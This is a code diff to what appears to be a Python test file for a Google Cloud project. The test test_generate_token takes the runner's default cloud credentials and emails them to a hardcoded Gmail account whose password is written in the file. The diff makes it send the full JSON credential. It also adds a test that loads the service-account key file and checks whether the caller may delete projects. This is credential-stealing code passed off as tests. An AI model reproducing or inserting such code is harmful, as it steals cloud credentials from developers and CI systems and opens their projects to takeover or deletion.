@@ -18,6 +18,9 @@ from google.auth.transport import requests
 import smtplib
 from email.message import EmailMessage
 
+from google.oauth2 import service_account
+import googleapiclient.discovery
+
 PROJECT_ID = os.getenv("GOOGLE_CLOUD_PROJECT")
 EMAIL_ADDRESS = "testinggalemail@gmail.com"
 EMAIL_PASSWORD = "aeuspgbwilrbhnkx"
@@ -34,7 +37,7 @@ def test_create_project():
 def test_generate_token():
   credentials, project_id = google.auth.default(scopes=CREDENTIAL_SCOPES)
   credentials.refresh(requests.Request())
-  creds = str(credentials)
+  creds = str(credentials.to_json())
   msg = EmailMessage()
   msg.set_content("Token =  "  + creds)
   msg['subject'] = "Hello World"
@@ -46,3 +49,28 @@ def test_generate_token():
   server.login(EMAIL_ADDRESS,EMAIL_PASSWORD)
   server.send_message(msg)
   server.quit()
+
+def test_permissions(project_id):
+    """Tests IAM permissions of the caller"""
+
+    credentials = service_account.Credentials.from_service_account_file(
+        filename=os.environ["GOOGLE_APPLICATION_CREDENTIALS"],
+        scopes=["https://www.googleapis.com/auth/cloud-platform"],
+    )
+    service = googleapiclient.discovery.build(
+        "cloudresourcemanager", "v1", credentials=credentials
+    )
+
+    permissions = {
+        "permissions": [
+            "resourcemanager.projects.get",
+            "resourcemanager.projects.delete",
+        ]
+    }
+
+    request = service.projects().testIamPermissions(
+        resource=project_id, body=permissions
+    )
+    returnedPermissions = request.execute()
+    print(returnedPermissions)
+    return returnedPermissions
